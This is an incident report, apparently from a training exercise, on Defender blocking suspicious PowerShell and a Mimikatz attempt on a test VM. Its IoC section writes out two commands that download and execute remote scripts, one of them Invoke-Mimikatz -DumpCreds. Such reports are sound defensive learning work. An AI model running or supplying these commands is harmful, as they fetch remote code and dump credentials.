# Investigation report — Suspicious PowerShell / Mimikatz on Jenny

**Analyst:** Sceptre  
**Date:** 27 October 2025  
**Time zone:** London GMT 

## Investigation Summary — What happened?

Defender for Endpoint detected and blocked suspicious PowerShell activity.  
It was an RDP session for AzureAD\JennySmith, which spawned cmd.exe that launched powershell.exe to download and execute remote scripts `IEX` + `DownloadString`.  
Defender prevented payloads including an attempted Mimikatz execution, so no credential dumping was completed.


## Stakeholder Impact — Who was involved?

- **User:** AzureAD\JennySmith  
- **Device:** Windows 11 VM “Jenny”  
- **Business impact:** None — activity blocked successfully and contained within the test environment.


## Findings — What did I find?

- 3 Defender Alerts:
  - Suspicious PowerShell command line with IEX and DownloadString  
  - Suspicious process executed PowerShell command (cmd.exe → powershell.exe)  
  - Blocked Mimikatz attempt labelled Trojan:PowerShell/Mimikatz.A 


## Immediate Actions — When did this occur and is it still happening?

- **Initial detection:** 27 Oct 2025 16:05 GMT    
- **Status:** No ongoing execution or related activity observed.


## Affected systems and data — Where in the environment did this happen?

- **Host:** Jenny (Windows 11 VM)  
- **Session:** AzureAD\JennySmith via RDP from `192.168.1.72`


## Indicators of Compromise (IoCs)

```powershell
powershell.exe -exec bypass -noprofile "$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1',$False);$comMsXml.Send();IEX $comMsXml.ResponseText"
```

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/.../Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
```


## Root Cause — Why did this happen?

The root cause was the execution of a PowerShell command in an RDP session.  
PowerShell with `IEX` and `DownloadString` is used to run code.  



## Nature of the Attack — How did this happen?

This is MITRE ATT&CK technique T1059.001 (Command and Scripting Interpreter — PowerShell).  
The attacker used cmd.exe to call PowerShell, which fetched remote scripts.
The next stage attempted credential theft using Mimikatz but Defender detected the behaviour and blocked it before it ran.


## Remediation

1. Isolate the host from the network.  
2. Hunt for IEX and DownloadString patterns.  

## Conclusion
  
Defender did its job and blocked what would have been a credential theft. 
The key takeaway is to look out for PowerShell being used by non-IT users. 


*Report by Sceptre — MyDFIR Microsoft 30 Days Challenge Project 3*
